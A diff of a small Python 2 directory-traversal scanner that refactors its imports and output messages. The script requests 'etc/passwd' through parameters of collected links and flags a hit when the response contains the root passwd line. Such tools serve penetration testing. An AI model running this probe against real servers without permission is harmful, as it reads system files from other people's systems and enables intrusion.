@@ -1,8 +1,7 @@
 import requests
-from utility import read_links, generate_url_with_params, get_success_message, get_url, get_params
+from utility import *
 
-print '\n'
-print 'start directory traversal'
+banner(DT)
 
 feeds = ['etc/passwd']
 nuggets = ['root:x:0:0:root:/root:/bin/bash']
@@ -25,7 +24,7 @@ for link in read_links():
             for nugget in nuggets:
                 if not hit and req.content.find(nugget) != -1:
                     hit = True
-                    print get_success_message(fullURL)
+                    success_message(fullURL)
             i = i + 1
 
-print 'finish directory traversal'
+print '\n'
